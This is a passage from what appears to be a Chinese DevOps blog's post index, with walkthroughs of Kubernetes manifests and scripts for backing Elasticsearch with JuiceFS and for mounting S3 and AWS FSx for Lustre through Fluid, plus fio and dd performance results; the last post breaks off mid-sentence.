为 elasticsearch-data-es-jfs-test-es-default-0，表示第一个节点的存储卷。\n2.2 格式化 JuiceFS 1 2 3 4 5 juicefs format \\ --storage $PROVIDER \\ --bucket $BUCKET_ENPOINT \\ redis://:$REDIS_PASSWORD@$REDIS_ENDPOINT \\ es-jfs-test 2.3 创建 PVC 创建 Dataset 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: Dataset metadata: name: $PVC_NAME namespace: $NAMESPACE spec: accessModes: - ReadWriteMany mounts: - name: es-jfs-test mountPoint: \u0026#34;juicefs://0/\u0026#34; options: bucket: $BUCKET_ENPOINT storage: $PROVIDER encryptOptions: - name: metaurl valueFrom: secretKeyRef: name: es-jfs-test key: metaurl - name: access-key valueFrom: secretKeyRef: name: es-jfs-test key: access-key - name: secret-key valueFrom: secretKeyRef: name: es-jfs-test key: secret-key EOF 需要注意 MountPoint 的格式是 juicefs://0/，表示第一个节点。创建第二个节点时，应该修改为 juicefs://1/。\n创建 Runtime 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: JuiceFSRuntime metadata: name: $PVC_NAME namespace: $NAMESPACE spec: replicas: 1 juicefsVersion: image: juicedata/juicefs-fuse imageTag: ce-v1.1.0 fuse: image: juicedata/juicefs-fuse imageTag: ce-v1.1.0 cleanPolicy: OnDemand worker: resources: limits: cpu: 15 memory: 200Gi tieredstore: levels: - mediumtype: SSD path: /cache quota: 40960 # 40GiB low: \u0026#34;0.1\u0026#34; EOF 创建一个测试的 Pod 创建测试 Pod 不仅仅是为了测试 PVC 能正常挂载，而是提前让 PVC 处理 Bound 状态，避免 Elasticsearch 又重新创建 PVC。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: Pod metadata: name: $PVC_NAME namespace: $NAMESPACE spec: containers: - name: demo image: shaowenchen/demo-ubuntu volumeMounts: - mountPath: /data/jfs name: data volumes: - name: data persistentVolumeClaim: claimName: $PVC_NAME EOF 参考 在 Kubernetes 下创建后端为 JuiceFS 的 PVC\n3. 部署 Elasticsearch 下面是一个简易的部署过程。\n3.1 安装 ECK Operator 因为最新版本的 ECK Operator 并不支持 Kubernetes v1.26.9，这里安装的是 ECK Operator v2.11.1。\n1 kubectl create -f https://raw.githubusercontent.com/shaowenchen/hubimage/main/observation/v2.11.1-eck-crds.yaml 1 kubectl apply -f https://raw.githubusercontent.com/shaowenchen/hubimage/main/observation/v2.11.1-eck-operator.yaml 3.2 部署 Elasticsearch 实例 需要注意的是这里的 count 设置为 1，表示只有一个节点。如果需要使用多个节点，那么需要提前创建对应的 PVC，并且保证其状态为 Bound。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: elasticsearch.k8s.elastic.co/v1 kind: Elasticsearch metadata: namespace: data-center name: es-jfs-test spec: version: 8.3.2 image: hubimage/elasticsearch:8.3.2 http: tls: selfSignedCertificate: disabled: true nodeSets: - name: default count: 3 config: node.store.allow_mmap: false podTemplate: spec: initContainers: - name: sysctl securityContext: privileged: true runAsUser: 0 command: [\u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;sysctl -w vm.max_map_count=262144\u0026#39;] - name: install-plugins command: - sh - -c - | bin/elasticsearch-plugin install --batch https://get.infini.cloud/elasticsearch/analysis-ik/8.3.2 securityContext: runAsUser: 0 runAsGroup: 0 containers: - name: elasticsearch env: - name: \u0026#34;ES_JAVA_OPTS\u0026#34; value: \u0026#34;-Xms30g -Xmx30g\u0026#34; resources: requests: cpu: 10 memory: 20Gi limits: cpu: 50 memory: 500Gi EOF 3.3 查看 Elasticsearch 密码 1 2 3 kubectl -n $NAMESPACE get secret es-jfs-test-es-elastic-user -o go-template=\u0026#39;{{.data.elastic | base64decode}}\u0026#39; xxx 默认用户名是 elastic\n4. 部署 Metricbeat 为了在 Kibana 中能看到 Elasticsearch 的指标数据，需要部署 Metricbeat。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: beat.k8s.elastic.co/v1beta1 kind: Beat metadata: name: es-jfs-test namespace: $NAMESPACE spec: type: metricbeat version: 8.3.2 elasticsearchRef: name: es-jfs-test config: metricbeat: autodiscover: providers: - type: kubernetes scope: cluster hints.enabled: true templates: - config: - module: kubernetes metricsets: - event period: 10s processors: - add_cloud_metadata: {} logging.json: true deployment: podTemplate: spec: serviceAccountName: metricbeat automountServiceAccountToken: true # required to read /etc/beat.yml securityContext: runAsUser: 0 EOF 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: name: metricbeat rules: - apiGroups: [\u0026#34;\u0026#34;] resources: - nodes - namespaces - events - pods verbs: [\u0026#34;get\u0026#34;, \u0026#34;list\u0026#34;, \u0026#34;watch\u0026#34;] - apiGroups: [\u0026#34;batch\u0026#34;] resources: - jobs verbs: [\u0026#34;get\u0026#34;, \u0026#34;list\u0026#34;, \u0026#34;watch\u0026#34;] - apiGroups: [\u0026#34;extensions\u0026#34;] resources: - replicasets verbs: [\u0026#34;get\u0026#34;, \u0026#34;list\u0026#34;, \u0026#34;watch\u0026#34;] - apiGroups: [\u0026#34;apps\u0026#34;] resources: - statefulsets - deployments - replicasets verbs: [\u0026#34;get\u0026#34;, \u0026#34;list\u0026#34;, \u0026#34;watch\u0026#34;] - apiGroups: - \u0026#34;\u0026#34; resources: - nodes/stats verbs: - get - nonResourceURLs: - /metrics verbs: - get EOF 1 2 3 4 5 6 7 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: ServiceAccount metadata: name: metricbeat namespace: $NAMESPACE EOF 1 2 3 4 5 6 7 8 9 10 11 12 13 14 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: metricbeat subjects: - kind: ServiceAccount name: metricbeat namespace: $NAMESPACE roleRef: kind: ClusterRole name: metricbeat apiGroup: rbac.authorization.k8s.io EOF 5. 部署 Kibana 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: kibana.k8s.elastic.co/v1 kind: Kibana metadata: namespace: $NAMESPACE name: es-jfs-test spec: version: 8.3.2 count: 1 image: hubimage/kibana:8.3.2 elasticsearchRef: name: es-jfs-test http: tls: selfSignedCertificate: disabled: true EOF 编辑 Kibana 的 Service 将 type 改为 NodePort。\n1 kubectl -n $NAMESPACE edit svc es-jfs-test-kb-http 此时就可以使用上面的 elastic 用户的密码登录 Kibana 了。\n6. 查看 JuiceFS 的文件目录 为了直观的查看一下 Elasticsearch 的文件目录，我在测试主机上挂载了上面的 JuiceFS 用于测试验证。\n挂载 JuiceFS 到测试主机 1 2 3 4 5 6 juicefs mount -d \\ --storage $PROVIDER \\ --bucket $BUCKET_ENPOINT \\ redis://:$REDIS_PASSWORD@$REDIS_ENDPOINT \\ es-jfs-test \\ /data/ops/es-jfs-test 查看目录结构 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 tree -L 2 . ├── 0 │ ├── indices │ ├── mytest │ ├── node.lock │ ├── nodes │ ├── snapshot_cache │ ├── _state │ └── test ├── 1 │ ├── indices │ ├── node.lock │ ├── nodes │ ├── snapshot_cache │ └── _state └── 2 ├── indices ├── node.lock ├── nodes ├── snapshot_cache └── _state 12 directories, 8 files 查看目录大小 部署完成之后，业务就开始导入数据进行测试了。\n1 2 3 du -sh 0 284M\t0 1 2 3 du -sh 1 322M\t1 1 2 3 du -sh 2 324M\t2 7. 总结 AI 相关设备的 CPU、Mem 配置都很高，但大家通常又只关注 GPU、NPU 算力卡的使用率。这导致了 AI 算力设备上 CPU、Mem 的使用率很低。\n最近有业务需求，使用 Elasticsearch 分词之后，查询大批量的语料数据，但又对成本非常敏感，不愿意使用 SSD 作为 Elasticsearch 的数据存储。\n本篇主要是记录使用 JuiceFS 存储对接 Elasticsearch 的过程，希望能够帮忙大家快速使用上。\n8. 参考 https://github.com/elastic/cloud-on-k8s/tree/2.11\nhttps://www.elastic.co/guide/en/cloud-on-k8s/2.11/k8s-quickstart.html\n","description":"","id":50,"section":"post","tags":["博文","Kubernetes","JuiceFS","Elasticsearch","数据存储"],"title":"使用 JuiceFS 存储 Elasticsearch 数据","uri":"https://www.chenshaowen.com/blog/store-elasticsearch-data-in-juicefs.html"},{"content":"1. 创建 Dataset 1 2 3 4 5 6 7 8 9 10 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: Secret metadata: name: my-s3 type: Opaque stringData: aws.accessKeyId: xxx aws.secretKey: xxx EOF 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: Dataset metadata: name: my-s3 spec: mounts: - mountPoint: s3://BUCKET/ name: s3 options: alluxio.underfs.s3.endpoint: ks3-cn-beijing-internal.ksyun.com alluxio.underfs.s3.disable.dns.buckets: \u0026#34;false\u0026#34; encryptOptions: - name: aws.accessKeyId valueFrom: secretKeyRef: name: my-s3 key: aws.accessKeyId - name: aws.secretKey valueFrom: secretKeyRef: name: my-s3 key: aws.secretKey accessModes: - ReadWriteMany EOF 2. 创建 Runtime 1 2 3 4 5 6 7 8 9 10 11 12 13 14 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: AlluxioRuntime metadata: name: my-s3 spec: tieredstore: levels: - mediumtype: MEM path: /dev/shm quota: 50Gi high: \u0026#34;0.95\u0026#34; low: \u0026#34;0.2\u0026#34; EOF 3. 创建测试 Pod 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: Pod metadata: name: s3-demo spec: containers: - name: demo image: shaowenchen/demo-ubuntu volumeMounts: - mountPath: /data name: data volumes: - name: data persistentVolumeClaim: claimName: my-s3 EOF 4. 性能测试 写入测试，18.1 MB/s 1 2 3 4 5 6 7 8 9 time dd if=/dev/zero of=./dd.txt bs=4M count=250 250+0 records in 250+0 records out 1048576000 bytes (1.0 GB, 1000 MiB) copied, 57.8283 s, 18.1 MB/s real\t1m14.210s user\t0m0.000s sys\t0m0.363s 读取测试，72.4 MB/s 1 2 3 4 5 time cp ./dd.txt /dev/null real\t0m13.823s user\t0m0.000s sys\t0m0.386s 带缓存的读取测试，4424.7 MB/s 1 2 3 4 5 time cp ./dd.txt /dev/null real\t0m0.226s user\t0m0.004s sys\t0m0.221s 5. 清理 1 2 3 4 kubectl delete pod s3-demo kubectl delete alluxioruntime my-s3 kubectl delete dataset my-s3 kubectl delete secret my-s3 6. 总结 使用 Fluid 直接将 S3 挂载为 PVC 性能不算好，以上的测试桶和集群在一个区域。\n已经挂载的 PVC 并不能看到 S3 桶的更新。也就是说，PVC 只是 S3 挂载瞬间的 Snapshort 不要在 PVC 中创建目录，目录不会同步到 S3 桶 不要在 PVC 中创建文件，文件不会同步到 S3 桶 读写速度都很慢 使用 s3fs + ThinRuntimeProfile 的方式应该更好，但目前暂时没有业务需求，另外如果是 OSS 可以使用 JindoRuntime 支持对象存储的加速。\n","description":"","id":51,"section":"post","tags":["博文","Fluid","JuiceFS","AI","Data"],"title":"Fluid 挂载 S3 为 PVC 以及性能测试","uri":"https://www.chenshaowen.com/blog/fluid-using-s3-as-pvc.html"},{"content":"1. 分析 Fluid 挂载 NFS 存储 查看 Fuse Pod 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 kubectl get pod nfs-demo-fuse-f9wg8 -oyaml apiVersion: v1 kind: Pod metadata: generateName: nfs-demo-fuse- spec: containers: - command: - /usr/local/bin/entrypoint.sh env: - name: FLUID_RUNTIME_TYPE value: thin - name: FLUID_RUNTIME_NS value: default - name: FLUID_RUNTIME_NAME value: nfs-demo - name: MOUNT_POINT value: /runtime-mnt/thin/default/nfs-demo/thin-fuse - name: MOUNT_OPTIONS value: ro image: fluidcloudnative/nfs:v0.1 imagePullPolicy: IfNotPresent lifecycle: preStop: exec: command: - sh - -c - umount /runtime-mnt/thin/default/nfs-demo/thin-fuse name: thin-fuse securityContext: privileged: true volumeMounts: - mountPath: /etc/fluid/config.json name: thin-conf readOnly: true subPath: config.json - mountPath: /etc/fluid/runtime.json name: runtime readOnly: true subPath: runtime.json hostNetwork: true 在启动之后，Fuse 会将存储目录挂载到 Node 上; 在停止之前，卸载存储目录。\n查看 Fluid 注入的配置文件 1 2 cat /etc/fluid/config.json {\u0026#34;mounts\u0026#34;:[{\u0026#34;mountPoint\u0026#34;:\u0026#34;x.x.x.x:/x-x\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;nfs-demo\u0026#34;}],\u0026#34;targetPath\u0026#34;:\u0026#34;/runtime-mnt/thin/default/nfs-demo/thin-fuse\u0026#34;,\u0026#34;accessModes\u0026#34;:[\u0026#34;ReadOnlyMany\u0026#34;]} 1 2 cat /etc/fluid/runtime.json {\u0026#34;workers\u0026#34;:[],\u0026#34;fuses\u0026#34;:[]} Fluid 会将 Dataset 中的 mountPoint 配置通过 Json 文件挂载注入到 Fuse 中。\n查看 Fuse 的启动脚本 1 2 3 4 5 6 7 8 9 cat /usr/local/bin/entrypoint.sh #!/usr/bin/env bash set +x python3 /fluid_config_init.py chmod u+x /mount-nfs.sh bash /mount-nfs.sh 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 cat fluid_config_init.py #!/usr/bin/env python import json rawStr = \u0026#34;\u0026#34; with open(\u0026#34;/etc/fluid/config.json\u0026#34;, \u0026#34;r\u0026#34;) as f: rawStr = f.readlines() rawStr = rawStr[0] script = \u0026#34;\u0026#34;\u0026#34; #!/bin/sh set -ex MNT_FROM=$mountPoint MNT_TO=$targetPath trap \u0026#34;umount ${MNT_TO}\u0026#34; SIGTERM mkdir -p ${MNT_TO} mount -t nfs ${MNT_FROM} ${MNT_TO} sleep inf \u0026#34;\u0026#34;\u0026#34; obj = json.loads(rawStr) with open(\u0026#34;mount-nfs.sh\u0026#34;, \u0026#34;w\u0026#34;) as f: f.write(\u0026#34;mountPoint=\\\u0026#34;%s\\\u0026#34;\\n\u0026#34; % obj[\u0026#39;mounts\u0026#39;][0][\u0026#39;mountPoint\u0026#39;]) f.write(\u0026#34;targetPath=\\\u0026#34;%s\\\u0026#34;\\n\u0026#34; % obj[\u0026#39;targetPath\u0026#39;]) f.write(script) Fuse Pod 启动时，会解析 config.json 文件，生成 mount-nfs.sh 脚本，并执行。\n2. 打包 Fluid Lustre Runtime 镜像 从上面的分析，我们看到对于这种 mount 挂载类型的文件存储服务，只需要打包一个对应的 Fuse 镜像即可接入 Fluid 进行管理。\n创建 fluid_config_init.py 脚本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #!/usr/bin/env python import json rawStr = \u0026#34;\u0026#34; with open(\u0026#34;/etc/fluid/config.json\u0026#34;, \u0026#34;r\u0026#34;) as f: rawStr = f.readlines() rawStr = rawStr[0] script = \u0026#34;\u0026#34;\u0026#34; #!/bin/sh set -ex MNT_FROM=$mountPoint MNT_TO=$targetPath trap \u0026#34;umount ${MNT_TO}\u0026#34; SIGTERM mkdir -p ${MNT_TO} mount -t lustre -o relatime,flock ${MNT_FROM} ${MNT_TO} sleep inf \u0026#34;\u0026#34;\u0026#34; obj = json.loads(rawStr) with open(\u0026#34;mount-lustre.sh\u0026#34;, \u0026#34;w\u0026#34;) as f: f.write(\u0026#39;mountPoint=\u0026#34;%s\u0026#34;\\n\u0026#39; % obj[\u0026#34;mounts\u0026#34;][0][\u0026#34;mountPoint\u0026#34;]) f.write(\u0026#39;targetPath=\u0026#34;%s\u0026#34;\\n\u0026#39; % obj[\u0026#34;targetPath\u0026#34;]) f.write(script) 只需调整一下 mount 命令即可。\n创建启动脚本 entrypoint.sh 1 2 3 4 5 6 #!/usr/bin/env bash set +x python /fluid_config_init.py chmod u+x /mount-lustre.sh bash /mount-lustre.sh 创建 Dockerfile 打包镜像 1 2 3 4 5 FROM amazon/aws-fsx-csi-driver:8e204f0ab565dd116bc39699391b6d642a3ae900 COPY ./fluid_config_init.py / COPY ./entrypoint.sh /usr/local/bin/ RUN chmod +x /usr/local/bin/entrypoint.sh ENTRYPOINT [] 编译镜像并推送镜像\n1 docker build -t shaowenchen/demo-fluid-lustre:latest . --push 3. Lustre 接入 Fluid 创建 Dataset 1 2 3 4 5 6 7 8 9 10 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: Dataset metadata: name: lustre-demo spec: mounts: - mountPoint: fs-x.fsx.us-west-2.amazonaws.com@tcp:/x name: lustre-demo EOF 注意这里的 mountPoint，如果需要挂载子目录 subdir，请提前创建。在生产过程中，多个 PVC 可能会共用一个 Lustre 后端。\n子目录挂载的格式为: fs-x.fsx.us-west-2.amazonaws.com@tcp:/x/subdir\n创建 Runtime 1 2 3 4 5 6 7 8 9 10 11 12 13 14 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: ThinRuntimeProfile metadata: name: lustre spec: fileSystemType: lustre fuse: image: shaowenchen/demo-fluid-lustre imageTag: latest imagePullPolicy: Always command: - \u0026#34;/usr/local/bin/entrypoint.sh\u0026#34; EOF 1 2 3 4 5 6 7 8 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: ThinRuntime metadata: name: lustre-demo spec: profileName: lustre EOF 创建 Pod 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: Pod metadata: name: lustre-demo spec: containers: - name: lustre-demo image: shaowenchen/demo-ubuntu volumeMounts: - mountPath: /data name: lustre-demo volumes: - name: lustre-demo persistentVolumeClaim: claimName: lustre-demo tolerations: - key: \u0026#34;node-role.kubernetes.io/control-plane\u0026#34; operator: \u0026#34;Exists\u0026#34; effect: \u0026#34;NoSchedule\u0026#34; EOF 4. 性能测试 下图是在 AWS 上申请的 FSx for Lustre 规格。\n4.1 直接挂载在主机上顺序读测试 安装 lustre-client 1 2 3 wget -O - https://fsx-lustre-client-repo-public-keys.s3.amazonaws.com/fsx-ubuntu-public-key.asc | gpg --dearmor | sudo tee /usr/share/keyrings/fsx-ubuntu-public-key.gpg \u0026gt;/dev/null bash -c \u0026#39;echo \u0026#34;deb [signed-by=/usr/share/keyrings/fsx-ubuntu-public-key.gpg] https://fsx-lustre-client-repo.s3.amazonaws.com/ubuntu focal main\u0026#34; \u0026gt; /etc/apt/sources.list.d/fsxlustreclientrepo.list \u0026amp;\u0026amp; apt-get update\u0026#39; apt install -y linux-aws lustre-client-modules-$(uname -r) 注意需要执行 sudo reboot 重启下机器。\n参考文档 https://docs.aws.amazon.com/zh_cn/fsx/latest/LustreGuide/install-lustre-client.html\n执行测试 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 fio -direct=1 -iodepth=32 -rw=read -ioengine=libaio -bs=4m -size=10g -numjobs=1 -runtime=1000 -group_reporting -filename=testfile --allow_mounted_write=1 -name=Sequ_Read_Testing Sequ_Read_Testing: (g=0): rw=read, bs=(R) 4096KiB-4096KiB, (W) 4096KiB-4096KiB, (T) 4096KiB-4096KiB, ioengine=libaio, iodepth=32 fio-3.16 Starting 1 process Jobs: 1 (f=1): [R(1)][96.7%][r=368MiB/s][r=92 IOPS][eta 00m:01s] Sequ_Read_Testing: (groupid=0, jobs=1): err= 0: pid=74694: Thu May 16 18:40:31 2024 read: IOPS=86, BW=347MiB/s (364MB/s)(10.0GiB/29479msec) slat (msec): min=7, max=260, avg=11.51, stdev=14.19 clat (usec): min=17, max=2646.5k, avg=344495.25, stdev=192586.04 lat (msec): min=11, max=2655, avg=356.01, stdev=197.77 clat percentiles (msec): | 1.00th=[ 284], 5.00th=[ 305], 10.00th=[ 309], 20.00th=[ 313], | 30.00th=[ 326], 40.00th=[ 330], 50.00th=[ 334], 60.00th=[ 334], | 70.00th=[ 338], 80.00th=[ 338], 90.00th=[ 342], 95.00th=[ 347], | 99.00th=[ 435], 99.50th=[ 2601], 99.90th=[ 2635], 99.95th=[ 2635], | 99.99th=[ 2635] bw ( KiB/s): min=303104, max=417792, per=100.00%, avg=384223.08, stdev=21823.92, samples=53 iops : min= 74, max= 102, avg=93.77, stdev= 5.35, samples=53 lat (usec) : 20=0.04% lat (msec) : 20=0.04%, 50=0.12%, 100=0.16%, 250=0.55%, 500=98.16% lat (msec) : 750=0.08%, 1000=0.04%, 2000=0.16%, \u0026gt;=2000=0.66% cpu : usr=0.04%, sys=6.67%, ctx=2614, majf=0, minf=32779 IO depths : 1=0.1%, 2=0.1%, 4=0.2%, 8=0.3%, 16=0.6%, 32=98.8%, \u0026gt;=64=0.0% submit : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, \u0026gt;=64=0.0% complete : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.1%, 64=0.0%, \u0026gt;=64=0.0% issued rwts: total=2560,0,0,0 short=0,0,0,0 dropped=0,0,0,0 latency : target=0, window=0, percentile=100.00%, depth=32 Run status group 0 (all jobs): READ: bw=347MiB/s (364MB/s), 347MiB/s-347MiB/s (364MB/s-364MB/s), io=10.0GiB (10.7GB), run=29479-29479msec 4.2 在 Pod 中顺序读测试 进入 Pod 1 2 3 kubectl exec -it lustre-demo bash cd /data 执行测试 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 fio -direct=1 -iodepth=32 -rw=read -ioengine=libaio -bs=4m -size=10g -numjobs=1 -runtime=1000 -group_reporting -filename=testfile --allow_mounted_write=1 -name=Sequ_Read_Testing Sequ_Read_TestingA: (g=0): rw=read, bs=(R) 4096KiB-4096KiB, (W) 4096KiB-4096KiB, (T) 4096KiB-4096KiB, ioengine=libaio, iodepth=32 fio-3.16 Starting 1 process Jobs: 1 (f=1): [R(1)][100.0%][r=364MiB/s][r=91 IOPS][eta 00m:00s] Sequ_Read_TestingA: (groupid=0, jobs=1): err= 0: pid=563: Thu May 16 18:11:28 2024 read: IOPS=78, BW=315MiB/s (330MB/s)(10.0GiB/32490msec) slat (msec): min=7, max=261, avg=12.69, stdev=21.49 clat (usec): min=3, max=5356.2k, avg=357490.74, stdev=319869.00 lat (msec): min=10, max=5386, avg=370.18, stdev=334.81 clat percentiles (msec): | 1.00th=[ 288], 5.00th=[ 309], 10.00th=[ 313], 20.00th=[ 317], | 30.00th=[ 326], 40.00th=[ 334], 50.00th=[ 334], 60.00th=[ 338], | 70.00th=[ 342], 80.00th=[ 347], 90.00th=[ 347], 95.00th=[ 351], | 99.00th=[ 355], 99.50th=[ 3171], 99.90th=[ 5336], 99.95th=[ 5336], | 99.99th=[ 5336] bw ( KiB/s): min=98304, max=417792, per=100.00%, avg=376955.83, stdev=41482.14, samples=54 iops : min= 24, max= 102, avg=92.00, stdev=10.13, samples=54 lat (usec) : 4=0.04% lat (msec) : 20=0.04%, 50=0.12%, 100=0.16%, 250=0.51%, 500=98.24% lat (msec) : 750=0.04%, 1000=0.04%, 2000=0.16%, \u0026gt;=2000=0.66% cpu : usr=0.05%, sys=6.02%, ctx=2757, majf=0, minf=32780 IO depths : 1=0.1%, 2=0.1%, 4=0.2%, 8=0.3%, 16=0.6%, 32=98.8%, \u0026gt;=64=0.0% submit : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, \u0026gt;=64=0.0% complete : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.1%, 64=0.0%, \u0026gt;=64=0.0% issued rwts: total=2560,0,0,0 short=0,0,0,0 dropped=0,0,0,0 latency : target=0, window=0, percentile=100.00%, depth=32 Run status group 0 (all jobs): READ: bw=315MiB/s (330MB/s), 315MiB/s-315MiB/s (330MB/s-330MB/s), io=10.0GiB (10.7GB), run=32490-32490msec Fluid 中，ThinRuntime 的 PVC 性能与主机直接挂载的性能，不会损失很多。这里需要注意，blocksize 和 size 的大小会严重影响测试的结果。如果只读取 1g 的数据，顺序读的性能可以达到 500+ MB/s; 如果 blocksize 为 128k，顺序读的性能又只有 100+ MB/s。因此，需要根据使用场景进行调整，才能准确评估。\n5. 总结 最近国内的模型推理服务需要在海外进行部署，我们选定了 AWS FSx for Lustre 作为存储后端，但为了保持业务层使用存储逻辑的一致性，需要将 Lustre 对接到 Fluid 中。\n国内的模型上传到 S3 之后，自动同步到 Lustre 中。\nFluid 早期版本就支持 Lustre，但 Fluid 社区中并没有提供详细的文档描述和 Demo 示例，因此本篇主要记录了使用 Fluid 的 ThinRuntime 对接 Lustre 的实践过程。\n由于我们仅用来存储推理模型，模型数据通常都是大文件，因此在性能测试方面仅测试了顺序读的速度。在我们选的规格下，PVC 中的速度能达到 300+ MB/s。\n","description":"","id":52,"section":"post","tags":["博文","Fluid","JuiceFS","AI","Data","Lustre"],"title":"Fluid 使用 Lustre Runtime 以及性能测试","uri":"https://www.chenshaowen.com/blog/fluid-using-lustre-runtime-and-performance-testing.html"},{"content":"1. 打包 Fluid Runtime 镜像 创建 fluid_config_init.py 脚本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #!/usr/bin/env python import json rawStr = \u0026#34;\u0026#34; with open(\u0026#34;/etc/fluid/config.json\u0026#34;, \u0026#34;r\u0026#34;) as f: rawStr = f.readlines() rawStr = rawStr[0] script = \u0026#34;\u0026#34;\u0026#34; #!/bin/sh set -ex MNT_FROM=$mountPoint MNT_TO=$targetPath trap \u0026#34;umount ${MNT_TO}\u0026#34; SIGTERM mkdir -p ${MNT_TO} mount -t lustre -o relatime,flock ${MNT_FROM} ${MNT_TO} sleep inf \u0026#34;\u0026#34;\u0026#34; obj = json.loads(rawStr) with open(\u0026#34;mount-lustre.sh\u0026#34;, \u0026#34;w\u0026#34;) as f: f.write(\u0026#39;mountPoint=\u0026#34;%s\u0026#34;\\n\u0026#39; % obj[\u0026#34;mounts\u0026#34;][0][\u0026#34;mountPoint\u0026#34;]) f.write(\u0026#39;targetPath=\u0026#34;%s\u0026#34;\\n\u0026#39; % obj[\u0026#34;targetPath\u0026#34;]) f.write(script) 只需调整一下 mount 命令即可。\n创建启动脚本 entrypoint.sh 1 2 3 4 5 6 #!/usr/bin/env bash set +x python /fluid_config_init.py chmod u+x /mount-lustre.sh bash /mount-lustre.sh 创建 Dockerfile 打包镜像 1 2 3 4 5 FROM efrecon/s3fs:1.78 COPY ./fluid_config_init.py / COPY ./entrypoint.sh /usr/local/bin/ RUN chmod +x /usr/local/bin/entrypoint.sh ENTRYPOINT [] 编译镜像并推送镜像\n1 docker build -t shaowenchen/demo-fluid-s3:latest . --push 3. Lustre 接入 Fluid 创建 Dataset 1 2 3 4 5 6 7 8 9 10 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: Dataset metadata: name: lustre-demo spec: mounts: - mountPoint: fs-x.fsx.us-west-2.amazonaws.com@tcp:/x name: lustre-demo EOF 注意这里的 mountPoint，如果需要挂载子目录 subdir，请提前创建。在生产过程中，多个 PVC 可能会共用一个 Lustre 后端。\n子目录挂载的格式为: fs-x.fsx.us-west-2.amazonaws.com@tcp:/x/subdir\n创建 Runtime 1 2 3 4 5 6 7 8 9 10 11 12 13 14 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: ThinRuntimeProfile metadata: name: lustre spec: fileSystemType: lustre fuse: image: shaowenchen/demo-fluid-lustre imageTag: latest imagePullPolicy: Always command: - \u0026#34;/usr/local/bin/entrypoint.sh\u0026#34; EOF 1 2 3 4 5 6 7 8 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: ThinRuntime metadata: name: lustre-demo spec: profileName: lustre EOF 创建 Pod 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: Pod metadata: name: lustre-demo spec: containers: - name: lustre-demo image: shaowenchen/demo-ubuntu volumeMounts: - mountPath: /data name: lustre-demo volumes: - name: lustre-demo persistentVolumeClaim: claimName: lustre-demo tolerations: - key: \u0026#34;node-role.kubernetes.io/control-plane\u0026#34; operator: \u0026#34;Exists\u0026#34; effect: \u0026#34;NoSchedule\u0026#34; EOF 4. 性能测试 下图是在 AWS 